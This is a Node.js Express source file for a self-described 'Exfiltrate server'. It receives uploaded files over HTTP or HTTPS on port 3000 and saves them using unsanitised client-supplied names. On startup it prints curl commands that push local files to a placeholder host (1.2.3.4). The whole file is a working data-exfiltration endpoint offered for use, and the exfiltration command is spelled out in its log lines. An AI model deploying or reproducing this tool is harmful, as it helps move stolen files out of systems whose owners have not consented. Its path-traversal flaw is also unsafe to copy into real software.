var express = require('express'),
    uuid = require('node-uuid'),
    fs = require('fs');

var arg = require('optimist')
    .usage('Usage: $0')
    .alias('h','help')
    .describe('insecure', 'Start insecure HTTP server');

var argv = arg.argv;

if (argv.help) {
    console.error(arg.help());
    process.exit();
}

var secure = true;
if (argv.insecure) {
    var app = module.exports = express.createServer();
    secure = false;
} else {
    var privateKey = fs.readFileSync('ssl/ssl.key').toString();
    //var ca = (config.http.ca) ? fs.readFileSync(config.http.ca).toString() : '';
    var certificate = fs.readFileSync('ssl/ssl.crt').toString();
    var app = express.createServer({key: privateKey, cert: certificate});
}

try {
    fs.mkdirSync(__dirname + "/files");
} catch (e) {
}
// Configuration
app.configure(function(){
  app.use(express.bodyParser());
});

app.post('/', function (req, res) {
    if (!req.files.data.name || req.files.data.name === '-') {
        req.files.data.name = uuid();
    }

    console.log("File uploaded: " + req.files.data.name);

    fs.rename(req.files.data.path, __dirname + "/files/" + req.files.data.name, 
function (err) {
        res.send('', 204);
    });
});

app.listen(3000, '0.0.0.0', function(){
    console.log("Exfiltrate server listening on 0.0.0.0:%d in %s mode", app.address().port, app.settings.env);
    console.log("Send files like this:");
    if (secure) {
        console.log('curl -k https://1.2.3.4:%d -F "data=@/path/to/filename"', app.address().port);
    } else { 
        console.log('curl http://1.2.3.4:%d -F "data=@/path/to/filename"', app.address().port);
    }
});
